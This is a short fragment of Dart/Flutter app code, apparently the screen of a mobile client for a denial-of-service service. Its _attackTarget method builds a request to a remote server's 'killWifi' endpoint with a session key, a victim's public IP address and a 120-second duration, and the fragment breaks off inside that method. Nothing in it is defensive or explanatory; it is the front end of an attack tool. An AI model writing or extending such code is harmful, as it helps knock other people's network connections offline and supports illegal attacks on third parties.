...
class _WifiInternalPageState extends State<WifiInternalPage> {
  ...
  final Color cardDark = const Color(0xFF0A1118); // Card background (dark)
  ...
  Future<void> _attackTarget() async {
    ...
    final url = Uri.parse(
        "https://private-server-production.up.railway.app/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
    try {
